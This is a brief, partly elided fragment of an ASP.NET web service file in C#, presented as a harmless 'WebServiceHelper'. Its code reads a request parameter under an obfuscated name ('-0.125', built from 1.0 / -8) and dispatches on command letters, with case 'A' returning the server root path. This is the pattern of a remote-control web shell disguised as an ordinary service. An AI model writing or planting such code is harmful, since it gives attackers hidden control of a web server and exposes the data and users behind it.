<%@ WebService Language="C#" Class="WebServiceHelper" %>
...
public class WebServiceHelper : System.Web.Services.WebService
{
    ...
    {
        System.Web.HttpContext hct = System.Web.HttpContext.Current;
        string Ret = string.Empty;
        try
        {
            string Z = hct.Request.Params["" + 1.0 / -8];
                ...
                case "A":
                    {
                        ...
                        Ret = String.Format("{0}\t", Server.MapPath("/"));
